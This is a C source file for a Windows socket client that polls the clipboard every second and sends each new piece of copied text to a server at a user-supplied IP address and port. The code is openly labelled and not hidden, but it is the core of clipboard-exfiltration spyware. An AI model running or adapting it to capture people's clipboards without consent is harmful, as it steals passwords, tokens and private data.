/* client process */

/* include the necessary header files */
#include <ctype.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SIZE sizeof(struct sockaddr_in)

char* get_clipboard_text() {
    if (!OpenClipboard(NULL))
        return NULL;

    HANDLE handle = GetClipboardData(CF_TEXT);
    if (handle == NULL) {
        CloseClipboard();
        return NULL;
    }

    char* clipboard_data = (char*)GlobalLock(handle);
    if (clipboard_data == NULL) {
        CloseClipboard();
        return NULL;
    }

    char* text = strdup(clipboard_data);

    GlobalUnlock(handle);
    CloseClipboard();

    return text;
}

int main(int argc, char** argv) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        return 1;
    }

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <IP address> <Port>\n", argv[0]);
        return 1;
    }

    char* ip_address = argv[1];
    int port = atoi(argv[2]);

    SOCKET sockfd;

    char* copied_data = NULL;

    /* initialize the internet socket with a port number of `port`
       and the address specified in ip_address */
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    /* convert and store the server's IP Address */
    server.sin_addr.s_addr = inet_addr(ip_address);
    /* convert and store the port */
    server.sin_port = htons(port);

    /* set up the transport end point */
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        perror("socket call failed");
        WSACleanup();
        return 1;
    }

    /* connect the socket to the server's address */
    if (connect(sockfd, (struct sockaddr*)&server, SIZE) == SOCKET_ERROR) {
        perror("connect call failed");
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    /* send information to the server */
    for (;;) {
        char* new_data = get_clipboard_text();

        if (copied_data == NULL || (new_data != NULL && strcmp(new_data, copied_data) != 0)) {
            printf("\nTransmitting Data to Server: %s\n", new_data);
            ssize_t bytes_sent = send(sockfd, new_data, strlen(new_data), 0);
            if (bytes_sent == SOCKET_ERROR) {
                perror("send failed");
                closesocket(sockfd);
                WSACleanup();
                return 1;
            }
            free(copied_data);
            copied_data = strdup(new_data);
        }

        printf("%s", copied_data);
        Sleep(1000);  // Sleep for 1 second (1000 milliseconds)
    }

    closesocket(sockfd);
    WSACleanup();

    return 0;
}
